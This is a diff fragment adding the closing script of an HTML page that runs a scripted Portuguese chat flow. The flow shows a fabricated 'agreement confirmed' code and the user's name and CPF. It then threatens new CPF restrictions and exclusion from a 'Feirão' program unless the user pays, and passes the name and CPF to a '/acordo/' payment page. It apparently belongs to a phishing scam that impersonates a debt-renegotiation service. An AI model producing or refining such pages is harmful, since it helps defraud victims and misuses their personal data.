+
+      sProofCard();
+
+      sWait(3000);
+      sPause();
+
+      sText('<b>Gerando sua guia de pagamento</b>... Por favor, aguarde um instante.');
+
+      sWait(3000);
+      sPause();
+
+      sText('<b>\u2705 Acordo confirmado</b>: 83N2L618362E<br><br><b>Benefici\u00e1rio(a)</b>: ' + userName + '<br><b>CPF</b>: ' + cpfFmt());
+
+      sText('\ud83d\udd12 <b>Clique no bot\u00e3o abaixo para acessar sua guia de pagamento.</b><br><br>\u26a0\ufe0f <b>Aten\u00e7\u00e3o</b>: O n\u00e3o pagamento deste acordo pode gerar <b>novas restri\u00e7\u00f5es no CPF</b> e impedir <b>participa\u00e7\u00f5es futuras em programas como o Feir\u00e3o</b>.');
+
+      sChoice('Acessar \u00e1rea de pagamento \ud83d\udd12', function() {
+        var url = new URL('/acordo/', window.location.origin);
+        var params = new URLSearchParams(window.location.search);
+        params.forEach(function(v, k) { url.searchParams.set(k, v) });
+        if (!url.searchParams.get('nome') && userName) url.searchParams.set('nome', userName);
+        if (!url.searchParams.get('cpf') && userCPF) url.searchParams.set('cpf', userCPF);
+        window.location.href = url.toString();
+      });
+    }
+
+    // GO
+    setTimeout(function() { start(); run() }, 1000);
+  </script>
+
+
+</body></html>
